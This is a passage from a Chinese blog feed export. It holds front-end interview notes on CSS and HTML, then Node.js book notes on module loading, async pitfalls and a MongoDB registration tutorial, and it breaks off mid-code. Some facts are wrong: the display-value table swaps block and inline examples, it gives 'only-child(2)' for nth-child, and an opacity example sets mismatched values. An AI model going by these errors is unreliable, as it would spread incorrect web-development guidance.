当中，相邻的两个盒子（可能是兄弟关系也可能是祖先关系）的外边距可以结合成一个单独的外边距。这种合并边距的方式被称为折叠，并且因而所集合的外边距称为折叠外边距 折叠结构遵循下列计算规则： 两个相邻的外边距都是正数时，折叠结果是它们两者之间较大的值。 两个相邻的外边距都是负数时，折叠结果是两者绝对值的较大值 两个外边距一正一负，折叠结果是两者的相加的和。 rgba() 和 opacity 的透明效果有什么不同？rgba() 和 opacity 都能实现透明效果，但是最大的不同是 opacity 作用于元素，以及元素内的所有内容的透明度。 而 rgba() 只作用于元素的颜色和其背景色。（设置 rgba透明的元素的子元素不会继承透明效果！） css 中可以让文字垂直和水平方向上重叠的两个属性是什么？垂直方向：line-height 水平方向：letter-spacing letter-spacing 的妙用：可以用于消除 Inline-block 元素间的换行符空格间隙问题 如何垂直居中一个浮动元素123456789101112131415161718192021222324252627282930/* 已知元素宽高 */#target&#123; background-color: #6699FF; width: 200px; height: 200px; position: absolute; /*父元素需要相对定位*/ top: 50%; left: 50%; /* 二分之一的 height，width*/ margin-top: -100px; margin-left: -100px;&#125;/* 未知元素宽高 */#target&#123; background-color: #6699FF; width: 200px; height: 200px; margin: auto; position: absolute; /*父元素需要相对定位*/ left: 0; top: 0; right: 0; bottom: 0;&#125;/* 垂直居中一个&lt;img&gt; */#container&#123; display: table-cell; text-align: center; vertical-align: middle;&#125; px 和 和 em 的区别。px 和 em 都是长度单位，区别是，px 的值是固定的，指定是多少就是多少，计算比较容易，em的值会继承父级元素的大小 浏览器的默认字体都是16px 所以未经调整的浏览器都符合 1em = 16px ，12px = 0.75em 10px = 0.625em 描述一个 ” reset ”的 的 CSS 文件并如何使用它 。 知道 normalize.css 吗？你了解他们的不同之处？重置样式非常多，凡是一个前端开发人员肯定有一个常用的重置 CSS 文件并知道如何使用它们。他们是盲目的在做还是知道为什么这么做呢？原因是不同的浏览器对一些元素有不同的默认样式，如果你不处理，在不同的浏览器下会存在必要的风险，或者更有戏剧性的性发生。 你可能会用 Normalize 来代替你的重置样式文件。它没有重置所有的样式风格，但仅提供了一套合理的默认样式值。既能让众多浏览器达到一致和合理，但又不扰乱其他的东西（如粗体的标题）。 在这一方面，无法做每一个复位重置。它也确实有些超过一个重置，它处理了你永远都不用考虑的怪癖，像 HTML 的 audio 元素不一致或 line-height 不一致。 Reset样式的目的就是清除某些浏览器的默认样式,方便css的书写：例如：*{margin:0;padding:0;list-style:none;} normalize的理念与reset的不同，他并不是清除浏览器的默认样式，而是尽量将所有的浏览器的默认样式统一。 Sass、Less 是什么？为什么要用？CSS 预处理器，是CSS 的一种抽象层，是一种特殊的语法或者说是语言编译成CSS。 例如 Less 是一种动态样式语言，将CSS 赋予了动态语言的特性，如变量，继承，运算，函数，Less 既可以在客户端上运行（支持 IE6+,Webkit,Firefox ）也可以在服务端运行（借助 Node.js ） 为什么要使用它们？ 结构清晰，便于扩展。 可以方便地屏蔽浏览器私有语法差异，封装对浏览器语法差异的重复处理，可以减少无意义的机械劳动。 可以轻松实现多重继承。 可以完全兼容 CSS 代码，可以方便应用到旧项目中。Less 只是在 CSS 语法上做了扩展，所有老的 CSS 代码也可以与 Less 代码一起编译。 display:none 与 visibility：hidden 的区别是什么？display：隐藏对应元素但不挤占该元素原来的空间。 visibility：隐藏对应的元素并且挤占该元素原来的空间。 即是，使用 CSS display：none 属性后，HTML 元素（对象）的宽高等属性值都将丢失，而使用 visibility：hidden 属性后，HTML 元素（对象）仅仅是在视觉上看不见（完全透明），而它占据的空间位置仍然是存在的。 CSS 中 link 和 @import 的区别是：Link 属于 html 标签，而 @import 是 CSS 中提供的。 在页面加载的时候， link 会同时被加载，而 @import 引用的 CSS 会在页面加载完成后才会加载引用的 CSS @import 只有在 ie5 以上才可以被识别，而 link 是 html 标签，不存在浏览器兼容性问题 Link 引入样式的权重大于 @import 的引用（@import 是将引用的样式导入到当前的页面中） 简介盒子模型CSS 的盒子模型有两种：IE 盒子模型，标准的 W3C 盒子模型 盒模型：内容、内边距、外边距（一般不计入盒子的实际宽度）、边框 为什么要初始化样式？由于浏览器兼容的问题，不同的浏览器对标签的默认样式值不同，若不初始化会造成不同浏览器之间的差异 但是初始化 CSS 会对搜索引擎优化造成小影响。 BFC 是什么？BFC（块级格式化上下文），一个创建了新的 BFC 的盒子是独立布局的，盒子内的元素的布局不会影响盒子外面的元素，在同一个 BFC 中的两个相邻的盒子在垂直方向发生 margin 重叠问题。 BFC 是指浏览器中创建了一个独立的渲染区域，该区域内所有元素的布局不会影响到区域外远元素的布局，这个渲染其区域只对块级元素起作用。 html 语义化是什么？当页面样式加载失败的时候能够让页面呈现出清晰的结构 有利于 seo 优化，利于被搜索引擎收录（更便于搜索引擎的爬虫程序来识别） 便于项目的开发维护，使 html 代码具有可读性，便于其他设备解析。 Doctype 的作用？严格模式与混杂模式的区别？&lt;!DOCTYPE&gt; 用于告知浏览器该以何种模式来渲染文档 严格模式下：页面排版以及 JS 解析是以该浏览器支持的最高标准来执行 混杂模式：不严格按照标准执行，主要是用来兼容旧的浏览器，向后兼容 IE 的双边距BUG：块级元素 float 后设置横向 margin ，ie6 显示的margin 比设置的打，解决：加入 _display:inlineHTML与 XHTML 两者的区别是什么？ 所有的标记都必须要有一个相应的结束标记 所有标签的元素和属性的名字都必须使用小写 所有 XML 标记必须合理嵌套起来 所有属性必须使用引号 括起来 把所有 &lt; 和 &amp; 特殊符号用编码表示 给所有属性赋一个值 不要在注释内容中使用 “——” 图片必须有说明文字 html 常见的兼容性问题？ 双边距 bug float 引起的，使用 display 3像素问题，使用 float 引起的 使用 display: inline -3px 超链接 hover 点击后失效 使用正确的书写顺序 link visited hover active IE z-index 问题，给父级添加 position：relative Png 透明，使用 js代码改 Min-height 最小高度 !important 解决 select 在 ie6 下遮盖 使用 iframe 嵌套 为什么没有办法定义 1px 左右的宽度容器（IE6 默认的行高造成的，使用 over:hidden,zoom:0.08,line-height:1px） IE6 不支持 PNG 透明背景，解决方法：IE6 下使用 gif 图片 IE-5 不支持 opacity ,解决方法： 12345.opacity&#123; opacity:0.4 filter: alpha(opacity = 60) /* for IE5-7 */ -ms-filter:"progid:DXImageTransform.Microsoft.Alpha(Opacity=60)";/* for IE8 */&#125; 对 WEB 标准以及 W3C 的理解和认识标签闭合、标签小写、不乱嵌套、提高搜索机器人搜索几率、使用外链css 和 js脚本、结构化行为表现的分离、文件下载与页面速度更快、内容能被更多的用户所访问、内容能被更广发的设备所访问、更少的代码和组件，容易维护，改版方便，不需要变动页面内容、提供打印版本而不需要复制内容、提供网站易用性。 行内元素有哪些？块级元素有哪些？CSS 的盒模型？空元素？块级元素：div p h1-4 form ul ol li dl dt 行内元素：a b br i span input select strong img CSS 盒模型：border+margin+padding+content] 空元素：&lt;br&gt;、&lt;hr&gt;、&lt;img&gt;、&lt;link&gt;、&lt;meta&gt;、&lt;area&gt;、base、&lt;col&gt;、&lt;command&gt;、&lt;embed&gt;、&lt;keygen&gt;、&lt;param&gt;、&lt;source1&gt;、&lt;track&gt;、&lt;wbr&gt; 前端页面有那三层构成，分别是什么？作用是什么？结构层 HTML 表示层 CSS 行为层 JS Doctype 作用？严格模式和混杂模式如何处罚这两种模式，区分它们有何意义？ &lt;!DOCTYPE&gt; 声明位于文档中的最前面，处于 &lt;html&gt; 标签之前，告知浏览器的解析器，用什么文档类型规范来解析这个文档。 严格模式的排版和 JS 运行模式是以该浏览器支持的最高标准运行 混杂模式中，页面以宽松的向后兼容的方式显示，模拟老式浏览器的行为以防止站点无法工作。 DOCTYPE 不存在或格式不正确导致文档以混杂模式呈现。 CSS 选择符有哪些？哪些属性可以继承？优先级算法如何计算？CSS3 新增伪类有哪些？选择符：id 选择器（#id） 类选择器（.class） 标签选择器（div,h1,p） 相邻选择器（h1+p） 后代选择器（li a） 通配符选择器（*） 属性选择器（a[rel = “external”]） 伪类选择器（a:hover,li:nth-child） 可以继承的属性font-size,font-family color ul li dl dd dt 不可以继承的属性border padding margin width height 优先级就近原则，样式定义最近者为准，载入样式以最后载入的定位为准 优先级!important &gt; id &gt; class &gt; tag important 比 内联优先级高 CSS 新增伪类p: first-of-type 选择属于其父元素的首个 &lt;p&gt; 元素的每个 &lt;p&gt; 元素 p: last-of-type 选择属于其父元素的最后 &lt;p&gt; 元素的每个 &lt;p&gt; 元素 p: only-of-type 选择属于其父元素唯一的 &lt;p&gt; 元素的每个 &lt;p&gt; 元素 p: only-child 选择属于其父元素的唯一子元素的每个 &lt;p&gt; 元素 p: only-child(2) 选择属于其父元素的第二个 子元素的每个 &lt;p&gt; 元素 :enable 、 ：disable 控制表单控件的禁用状态 :checked 单选框或复选框被选中 经常遇到的浏览器兼容性有哪些，原因，解决方法，常用的 hack 技巧png24 的图片在 IE6 浏览器上出现背景，解决方案是做成 PNG8 浏览器默认的 margin 和 padding 不同，解决方案是加一个全局的 *{margin:0,padding:0;}来统一 IE6 双边距bug: 快属性标签 float 后，又有横行的 margin 的情况下，在 ie6 显示的 margin 比设置的大。 浮动 ie 产生的双倍距离 #box{ float:left, width:10px; margin: 0 0 0 100px } 在这种情况之下 IE 会产生 20px 的距离，解决方案是在 float 的标签样式控制加入 _display:inline 将其转化为行内属性（_这个符号只有 ie6 会识别） 渐进识别的方式，从总体中逐渐排除局部。 首先，巧妙的使用 \9这一标记，将IE 浏览器从所有情况中分离出来。 接着 再次使用 + 将 IE8 和 IE7/6 分离出来。 123456.bb&#123; background-color:#452142;/* 所有识别 */ .background-color:#452143\9;/* IE6/7/8 识别 */ +background-color:#452144;/* IE6/7 识别 */ _background-color:#452145;/* IE6 识别 */&#125; IE 下，可以使用获取常规属性的方法来获取自定义属性，也可以使用 getAttribute() 获取自定义属性 Firefox 下，只能使用 getAttribute()获取自定义属性 解决方法：统一通过 getAttribute() 获取自定义属性 IE 下， event 对象有 x,y属性，但是没有 pageX，pageY 属性； Firefox 下，event 对象有 pageX，pageY 属性，但是没有x,y属性 （条件注释）缺点是在 IE 浏览器下可能会增加额外的 HTTP 请求数 Chrome 中文界面下默认会将小于 12px 的文本强制按照 12px 显示，可通过加入 CSS 属性 -webkit-text-size-adjust:none； 解决 列出 display 的值，说明它们的作用，position 的值，relative 和 absolute 原点是？ display 的值 描述 常见代表 none 此元素不会显示 无 block 此元素将会显示为块级元素，此元素前后带有换行符 &lt;a&gt;、&lt;span&gt;、&lt;br/&gt;、&lt;i&gt;、&lt;em&gt;、&lt;strong&gt; inline 默认。此元素会被显示为内联元素，元素前后没有换行符 &lt;div&gt;、&lt;p&gt;、&lt;h1&gt;…&lt;h6&gt;、&lt;ol&gt;、&lt;ul&gt;、&lt;dl&gt; inline-block 行内块元素，即是内联元素，又可以设置宽高以及行高，底边距 &lt;img&gt;、&lt;input&gt; position的值 定位 特点 static 默认值 元素出现在正常的文档流中，不会受left、top、right、bottom的影响 relative 相对定位，相对自身位置定位 可通过设置left、top、right、bottom的值来设置位置，并且它原本所占的空间不变，即不会影响其他元素布局，经常被用来作绝对元素的容器块 absolute 绝对定位，相对于最近的除static定位以外的元素定位，若没有，则相对于html定位 脱离了文档流，不占据文档空间，若设置absolute，但没有设置top、left等值，其位置不变；若设置absolute，会影响未定义宽度的块级元素，使其变为包裹元素内容的宽度。 fixed 固定定位 相对于浏览器窗口定位 脱离文档流，不会随页面滚动而变化 position 跟 display 、margin collapse、overflow、float 这些特征相互叠加后会怎么样？https://www.cnblogs.com/jackyWHJ/p/3756087.html CSS 的基本语句构成是？选择器{属性1：值1；属性2：值2，……} CSS 中可以通过哪些属性定义，使得一个 DOM 元素不显示在浏览器可视范围内？最基本的：设置 display 的属性为 none,或者设置 visibility 属性为 hidden 技巧性： 设置宽高为0，设置透明度为0，设置 z-index 位置在 -1000 什么是外边距重叠？重叠的结果是什么？外边距重叠就是 margin-collapse 在 CSS 当中，相邻的两个盒子（可能是小弟关系也可能是祖先关系）的外边距可以结合成一个单独的外边距，这种合并外边距的方式被称为折叠，并且因而所结合成的外边距被称为折叠外边距。 折叠结果遵循下列的计算规则： 两个相邻的外边距都是正数时，折叠结果是它们两者之间的较大的数 两个相邻的外边距都是负数时，折叠结果是两者绝对值较大的值 两个外边距一正一负，折叠结果是两者相加的和。 b 标签和 strong 标签， i 标签和 em 标签的区别？后者有语义，前者则无。 参考链接： 怪异模式（Quirks Mode）对 HTML 页面的影响 quirks模式是什么？它和standards模式有什么区别 百度百科_webp格式 什么是微格式？在前端构建中应该考虑微格式吗？ display和position的值与作用]]></content>
      <categories>
        <category>前端面试</category>
      </categories>
      <tags>
        <tag>前端面试题</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[好玩的Nodejs —— Node.js进阶话题]]></title>
    <url>%2F2018-10-13-NodeJs-Part6.html</url>
    <content type="text"><![CDATA[Node.js进阶话题这本书的最后一章，主要讲解的内容为以下几点 模块加载机制 异步编程模式下的控制流 Node.js 应用部署 Node.js 的一些劣势 模块加载机制模块的类型Node.js 的模块可以分为两大类，一类是核心模块，另一类是文件模块。核心模块就是 Node.js 标准 API 中提供的模块，如 fs、http、net、vm等，这些都是 Node.js 官方提供的模块，编译成了二进制代码。我们可以直接通过 require 获取核心模块。核心模块拥有最高的加载优先级，如果有模块与其命名冲突，Node.js 总是会先加载核心模块。 文件模块则是存储为单独的文件（或文件夹）的模块，可能是 JavaScript 代码、JSON 或编译好的 C/C++ 代码。文件模块的加载方法相对复杂，但十分灵活，尤其是和 npm 结合使用时，在不显式指定文件模块扩展名的时候，Node.js 会分别试图加上 .js、.json 和 .node 扩展名。.js 是 JavaScript 代码，.json 是 JSON 格式的文本，.node 是编译好的 C/C++ 代码。 下表总结了 Node.js 模块的类型，从上到下加载优先级由高到低。 核心模块 内建 文件 JavaScript .js JSON .json C/C++ 扩展 .node 按路径加载模块文件模块的加载有两种方式，一种是按路径加载，一种是查找 node_modules 文件夹。如果 require 参数以 “/” 开头，那么就绝对路径的方式查找路径模块名称。如果 require (‘/home/lbh/module’) 将会按照优先级依次尝试加载 /home/lbh/module.js、/home/lbh/module.json 和 /home/lbh/module.node。 如果 require 参数以“ ./ ”或“ ../ ”开头，那么则以相对路径的方式来查找模块，这种方式在应用中是最常见的。例如前面的例子中我们用了 require(‘./hello’) 来加载同一文件夹下的hello.js。 通过查找 node_modules 目录加载模块如果 require 参数不以“ / ”、“ ./ ”或“ ../ ”开头，而该模块又不是核心模块，那么就要通过查找 node_modules 加载模块了。我们使用npm获取的包通常就是以这种方式加载的。 在某个目录下执行命令 npm install express， 你会发现出现了一个叫做node_modules的目录 在 node_modules 目录的外面一层，我们可以直接使用 require(‘express’) 来代替require(‘./node_modules/express’) 。这是Node.js模块加载的一个重要特性：通过查找 node_modules 目录来加载模块。 当 require 遇到一个既不是核心模块，又不是以路径形式表示的模块名称时，会试图在当前目录下的 node_modules 目录中来查找是不是有这样一个模块。如果没有找到，则会在当前目录的上一层中的 node_modules 目录中继续查找，反复执行这一过程，直到遇到根目录为止. 举个例子，我们要在 /home/lbh/develop/foo.js 中使用 require(‘bar.js’) 命令，Node.js会依次查找： /home/lbh/develop/node_modules/bar.js /home/lbh/node_modules/bar.js /home/node_modules/bar.js /node_modules/bar.js 为什么要这样做呢？因为通常一个工程内会有一些子目录，当子目录内的文件需要访问到工程共同依赖的模块时，就需要向父目录上溯了 比如说工程的目录结构如下： 123456789101112|- project |- app.js |- models |- ... |- views |- ... |- controllers |- index_controller.js |- error_controller.js |- ... |- node_modules |- express 我们不仅要在 project 目录下的 app.js 中使用 require(‘express’) ，而且可能要在controllers 子目录下的 index_controller.js 中也使用 require 加载缓存Node.js 模块不会被重复加载，这是因为 Node.js 通过文件名缓存所有加载过的文件模块，所以以后再访问到时就不会重新加载了。注意，Node.js 是根据实际文件名缓存的，而不是 require() 提供的参数缓存的，也就是说即使你分别通过require(‘express’) 和 require(‘./node_modules/express’) 加载两次，也不会重复加载，因为尽管两次参数不同，解析到的文件却是同一个。 加载顺序总结一下使用 require(some_module) 时的加载顺序。 (1) 如果 some_module 是一个核心模块，直接加载，结束。(2) 如果 some_module 以“ / ”、“ ./ ”或“ ../ ”开头，按路径加载 some_module ，结束。(3) 假设当前目录为 current_dir，按路径加载 current_dir/node_modules/some_module。 如果加载成功，结束。 如果加载失败，令current_dir为其父目录。 重复这一过程，直到遇到根目录，抛出异常，结束。 控制流基于异步 I/O 的事件式编程容易将程序的逻辑拆得七零八落，给控制流的疏理制造障碍。让我们通过下面的例子来说明这个问题。 循环的陷阱Node.js 的异步机制由事件和回调函数实现，一开始接触可能会感觉违反常规，但习惯以后就会发现还是很简单的。然而这之中其实暗藏了不少陷阱，一个很容易遇到的问题就是循环中的回调函数，初学者经常容易陷入这个圈套。让我们从一个例子开始说明这个问题。 123456789//forloop.jsvar fs = require('fs');var files = ['a.txt','b.txt','c.txt'];for(var i = 0; i &lt; files.length; i++)&#123; fs.readFile(files[i],'utf-8',function(err,contents)&#123; console.log(files[i]+ ':' + contents); &#125;);&#125; 这段代码的功能很直观，就是依次读取文件 a.txt、b.txt、c.txt，并输出文件名和内容。假设这三个文件的内容分别是 AAA、BBB 和 CCC，那么我们期望的输出结果就是： 123a.txt: AAAb.txt: BBBc.txt: CCC 而实际上运行代码后，得到的是 123undefined: AAAundefined: BBBundefined: CCC 在读取文件的回调函数中分别输出 files 、 i 和 files[i] 。 可以发现三次输出的i 都是3，超出了 files 数组的下标，因为得到的 files[i] 就都是 undefined 。说明了 fs.readFile 的回调函数中访问到的 i 值都是循环退出以后的，因此不能分辨，可以通过闭包来解决这个问题。代码如下： 123456789var fs = require('fs');var files = ['a.txt','b.txt','c.txt'];for(var i = 0; i &lt; files.length; i++)&#123; (function(i)&#123; fs.readFile(files[i],'utf-8',function(err,contents)&#123; console.log(files[i]+ ':' + contents); &#125;); &#125;)(i)&#125; 上面代码在 for 循环体中建立了一个匿名函数，将循环迭代变量 i 作为函数的参数传递并调用。由于运行时闭包的存在，该匿名函数中定义的变量（包括参数表）在它内部的函数（ fs.readFile 的回调函数）执行完毕之前都不会释放，因此我们在其中访问到的 i 就分别是不同的闭包实例，这个实例是在循环体执行的过程中创建的，保留了不同的值。事实上以上这种写法并不常见，因为它降低了程序的可读性，故不推荐使用。大多数情况下我们可以用数组的 forEach 方法解决这个问题： 123456789101112//callbackforeach.js// callbackforeach.jsvar fs = require('fs');var files = ['a.txt','b.txt','c.txt'];files.forEach(function(filename)&#123; fs.readFile(filename,'utf-8',function(err,contents)&#123; console.log(filename + ':' + contents ); &#125;);&#125;); 解决控制流难题除了循环的陷阱，Node.js 异步式编程还有一个显著的问题，即深层的回调函数嵌套。在这种情况下，我们很难像看基本控制流结构一样一眼看清回调函数之间的关系，因此当程序规模扩大时必须采取手段降低耦合度，以实现更加优美、可读的代码。这个问题本身没有立竿见影的解决方法，只能通过改变设计模式，时刻注意降低逻辑之间的耦合关系来解决。 除此之外，还有许多项目试图解决这一难题。async 是一个控制流解耦模块，它提供了async.series 、 async.parallel 、 async.waterfall 等函数，在实现复杂的逻辑时使用这些函数代替回调函数嵌套可以让程序变得更清晰可读且易于维护，但你必须遵循它的编程风格。 streamlinejs和jscex则采用了更高级的手段，它的思想是“变同步为异步”，实现了一个JavaScript 到JavaScript 的编译器，使用户可以用同步编程的模式写代码，编译后执行时却是异步的。eventproxy 的思路与前面两者区别更大，它实现了对事件发射器的深度封装，采用一种完全基于事件松散耦合的方式来实现控制流的梳理。无论是以上哪种解决手段，都不是“非侵入性的”，也就是说它对你编程模式的影响是非常大的，你几乎不可能无代价地在使用了一种模式很久以后从容地换成另一种模式，或者直接糅合使用两种模式。而且它们都是在解决了深层嵌套的回调函数可读性问题的同时，引入了其他复杂的语法，带来了另一种可读性的降低。所以，是否使用，使用哪种方案，在决定之前是需要仔细斟酌研究的。 Node.js 不适合做什么计算密集型的程序理想情况下，Node.js单线程在执行的过程中会将一个CPU核心完全占满，所有的请求必须等待当前请求处理完毕以后进入事件循环才能响应。如果一个应用是计算密集型的，那么除非你手动将它拆散，否则请求响应延迟将会相当大。 例如，某个事件的回调函数中要进行复杂的计算，占用CPU 200毫秒，那么事件循环中所有的请求都要等待200毫秒。为了提高响应速度，你唯一的办法就是把这个计算密集的部分拆成若干个逻辑，这给编程带来了额外的复杂性。即使这样，系统的总吞吐量和总响应延迟也不会降低，只是调度稍微公平了一些。 单用户多任务型应用前面我们讨论的通常都是服务器端编程，其中一个假设就是用户数量很多。但如果面对的是单用户，譬如本地的命令行工具或者图形界面，那么所谓的大量并发请求就不存在了。于是另一个恐怖的问题出现了，尽管是单用户，却不一定是单任务。例如给用户提供界面的同时后台在进行某个计算，为了让用户界面不出现阻塞状态，你不得不开启多线程或多进程。而Node.js 线程或进程之间的通信到目前为止还很不便，因为它根本没有锁，因而号称不会死锁。Node.js 的多进程往往是在执行同一任务，通过多进程利用多处理器的资源，但遇到多进程相互协作时，就显得捉襟见肘了。 逻辑十分复杂的事务Node.js 的控制流不是线性的，它被一个个事件拆散，但人的思维却是线性的，当你试图转换思维来迎合语言或编译器时，就不得不作出牺牲。举例来说，你要实现一个这样的逻辑：从银行取钱，拿钱去购买某个虚拟商品，买完以后加入库存数据库，这中间的任何一步都可能会涉及数十次的I/O操作，而且任何一次操作失败以后都要进行回滚操作。这个过程是线性的，已经很复杂了，如果要拆分为非线性的逻辑，那么其复杂程度很可能就达到无法维护的地步了。Node.js更善于处理那些逻辑简单但访问频繁的任务，而不适合完成逻辑十分复杂的工作。 到这里 关于 nodejs 开发指南这本书就算阅读完了，通过这本书，大概地了解了NodeJS的特性，通过node+express+mongodb 搭建了一个微博的雏形实例，希望后面有机会可以完善它。这本书附录还有JavaScript的一些特性以及Node.js 编程的规范，如果有价值再稍后总结学习。]]></content>
      <categories>
        <category>Nodejs</category>
      </categories>
      <tags>
        <tag>Nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[好玩的Nodejs —— 使用 Node.js进行 Web 开发（下）]]></title>
    <url>%2F2018-10-11-NodeJs-Part5%E4%B8%8B.html</url>
    <content type="text"><![CDATA[国庆回家因为拜访做客的原因，没有时间可以更新，回来又要开始赶项目，今天趁着后端去开会把主机都拔了。把用户注册和登录以及发表微博的功能给解决了。 使用 Node.js 进行 Web 开发（下）用户注册和登录在上一节我们使用 Bootstrap 创建了网站的基本框架。在这一节我们要实现用户会话的功能，包括用户注册和登录状态的维护。为了实现这些功能，我们需要引入会话机制来记录用户状态，还要访问数据库来保存和读取用户信息。现在就让我们从数据库开始。 访问数据库选用 MongoDB 作为网站的数据库系统，它是一个开源的 NoSQL 数据库，相比 MYSQL 那样的关系型数据库，它更为轻巧，灵活，非常适合在数据规模很大、事务性不强的场合使用。 NoSQL在传统的数据库中，数据库的格式是由表（table）、行（row）、字段（field）组成的。表具有固定的结构，规定了每行有哪些字段，在创建时被定义，之后修改很困难。行的格式是相同的，由若干个固定的字段组成的。每个表可能有若干个字段作为索引（index）,这其中有点是主键（primary key），用于与约束表中的数据，还有一个唯一键（unique key），确保字段中不存放重复数据。表和表之间可能还有相互的约束，称为外键（foreign key ）。对数据库的每次查询都要以行为单位，复杂的查询包括嵌套查询、连接查询和交叉表查询。 拥有这些功能的数据库被称为关系型数据库，关系型数据库通常使用一种叫做 SQL （Structured Query Language） 的查询语言作为接口，因此又被称为 SQL 数据库。典型的 SQL 数据库有 MySQL、Oracle、Microsoft SQL Server、PostgreSQL、SQLite，等等。 NoSQL 是 1998 年被提出的，它曾经是一个轻量、开源、不提供SQL功能的关系数据库。但现在 NoSQL 被认为是 Not Only SQL 的简称，主要指非关系型、分布式、不提供 ACID 的数据库系统。正如它的名称所暗示的，NoSQL 设计初衷并不是为了取代 SQL 数据库的，而是作为一个补充，它和 SQL 数据库有着各自不同的适应领域。NoSQL 不像 SQL 数据库一样都有着统一的架构和接口，不同的 NoSQL 数据库系统从里到外可能完全不同。 MongoDBMongoDB 是一个对象数据库，它没有表、行等概念，也没有固定的模式和结构，所有的数据以文档的形式存储。所谓的文档就是一个关联数组式的对象，它的内部由属性组成，一个属性对应一个数、字符串、日期、数组、甚至是一个嵌套的文档。下面是一个 MongoDB 文档的实例 1234567891011&#123; "_id" : ObjectId( "4f7fe8432b4a1077a7c551e8" ), "uid" : 2018, "username" : "lbh", "net9" : &#123; "nickname" : "lbh", "surname" : "lbh", "givenname" : "lbh", "fullname" : "lbh", "emails" : [ "544289495@qq.com"], "website" : "http://laibh.top", "address" : "GuangDong University" &#125;&#125; 上面文档中 uid 是一个整数属性， username 是字符串属性， _id 是文档对象的标识符，格式为特定的 ObjectId 。 net9 是一个嵌套的文档，其内部结构与一般文档无异。从格式来看文档好像 JSON，没错，MongoDB 的数据格式就是 JSON（准确地说，MongoDB 的数据格式是 BSON （Binary JSON），它是 JSON 的一个扩展。） ，因此与 JavaScript 的亲和性很强。在Mongodb 中对数据的操作都是以文档为单位的，当然我们也可以修改文档的部分属性。对于查询操作，我们只需要指定文档的任何一个属性，就可在数据库中将满足条件的所有文档筛选出来。为了加快查询，MongoDB 也对文档实现了索引，这一点和 SQL 数据库一样。 连接数据库在本地安装 MongoDB ,点击 http://www.mongodb.org/ 去官网下载。接着在项目里面，使用命令 12345// 全局安装驱动npm install mongodb -g// 在当前项目中引入mongodbnpm install mongodb --save 接下来在工程的目录中创建 settings.js 文件，这个文件用于保存数据库的连接信息。我们将用到的数据库命名为 microblog，数据库服务器在本地，因此Settings.js文件的内容如下： 12345module.exports = &#123; cookieSecret: 'microblogbyvoid', db: 'microblog', host: 'localhost',&#125;; 其中， db 是数据库的名称， host 是数据库的地址。 cookieSecret 用于 Cookie 加密与数据库无关,留作后面有作用。 接下来在 models 子目录中创建 db.js，内容是： 123456var settings = require('../settings');var Db = require('mongodb').Db;var Connection = require('mongodb').Connection;var Server = require('mongodb').Server;module.exports = new Db(settings.host, new Server(Connection.DEFAULT_PORT, &#123;&#125;)); 以上代码通过 module.exports 输出了创建的数据库连接，在后面的小节中我们会用到这个模块。由于模块只会被加载一次，以后我们在其他文件中使用时均为这一个实例。 会话支持在完成用户注册和登录功能之前,需要先了解会话的概念。会话是一种持久的网络协议，用于完成服务器和客户端之间一些交互行为，会话是一个比较连接粒度更大的概念，一次会话可能包含多次连接，每次连接都被认为是会话的一些操作。在网络应用开发中，有必要实现会话来帮助用户交互。例如网上购物的场景，用户浏览了多个页面，购买了一些物品，这些请求在多次连接中完成。许多应用层网络协议都是由会话支持的，如 FTP、Telnet 等，而 HTTP 协议是无状态的，本身不支持会话，因此在没有额外手段的帮助下，前面场景中服务器不知道用户购买了什么。 为了在无状态的 HTTP 协议之上实现会话，Cookie 诞生了。Cookie 是一些存储在客户端的消息，每次连接的时候由浏览器向服务器递交，服务器也向浏览器发起存储 Cookie 的请求，依靠这样的手段服务器可以识别客户端。我们通常意义上的 HTTP 会话功能就是这样实现的。具体来说，浏览器首次向服务器发起请求时，服务器生成一个唯一标识符并发送给客户端浏览器，浏览器将这个唯一标识符存储在 Cookie 中，以后每次再发起请求，客户端浏览器都会向服务器传送这个唯一标识符，服务器通过这个唯一标识符来识别用户。 对于开发者来说，我们无须关心浏览器端的存储，需要关注的仅仅是如何通过这个唯一标识符来识别用户。很多服务端脚本语言都有会话功能，如 PHP，把每个唯一标识符存储到文件中。Express 也提供了会话中间件，默认情况下是把用户信息存储在内存中，但我们既然已经有了 MongoDB，不妨把会话信息存储在数据库中，便于持久维护。为了使用这一功能，我们首先要获得一个叫做 connect-mongo 的模块。 1npm i connect-mongo -S 在 app.js 中添加以下内容 123456789var MongoStore = require('connect-mongo');var settings = require('./settings');app.use(express.session(&#123; secret: settings.cookieSecret, store: new MongoStore(&#123; db: settings.db &#125;)&#125;)); 其中 express.cookieParser() 是 Cookie 解析的中间件。 express.session() 则提供会话支持，设置它的 store 参数为 MongoStore 实例，把会话信息存储到数据库中，以避免丢失。在后面可以通过 req.session 获取当前用户的会话对象，以维护用户相关的信息。 注册和登入我们已经准备好了数据库访问和会话存储的相关信息，接下来开始实现网站的第一个功能，用户注册和登入。 注册页面首先来设计用户注册页面的表单，创建 views/reg.ejs 文件，内容是： 123456789101112131415161718192021222324252627&lt;form class="form-horizontal" method="post"&gt; &lt;fieldset&gt; &lt;legend&gt;用户注册&lt;/legend&gt; &lt;div class="control-group"&gt; &lt;label class="control-label" for="username"&gt;用户名&lt;/label&gt; &lt;div class="controls"&gt; &lt;input type="text" class="input-xlarge" id="username" name="username"&gt; &lt;p class="help-block"&gt;你的账户名称，用于登录和显示。&lt;/p&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="control-group"&gt; &lt;label class="control-label" for="password"&gt;口令&lt;/label&gt; &lt;div class="controls"&gt; &lt;input type="password" class="input-xlarge" id="password" name="password"&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="control-group"&gt; &lt;label class="control-label" for="password-repeat"&gt;重复输入口令&lt;/label&gt; &lt;div class="controls"&gt; &lt;input type="password" class="input-xlarge" id="password-repeat" name="password-repeat"&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class="form-actions"&gt; &lt;button type="submit" class="btn btn-primary"&gt;注册&lt;/button&gt; &lt;/div&gt; &lt;/fieldset&gt;&lt;/form&gt; 这个表单中有3个输入单元，分别是 username 、 password 和 password-repeat 。表单的请求方法是 POST，将会发送到相同的路径下。 接着在 router/index.js 里面设置好路由 1234// 用户注册router.get('/reg', function (req, res, next) &#123; res.render('reg', &#123; title: '用户注册' &#125;);&#125;); 现在运行 app.js，在浏览器中打开 http://localhost:3000/reg ，可以看到 注册响应实现注册响应，在 router/index.js 里面添加 /reg 的 POST 响应函数 1234567891011121314151617181920212223242526272829303132333435router.post('/reg', function (req, res, next) &#123; console.log(res.body); if (req.body['password-repeat'] != req.body['password']) &#123; req.flash('error', 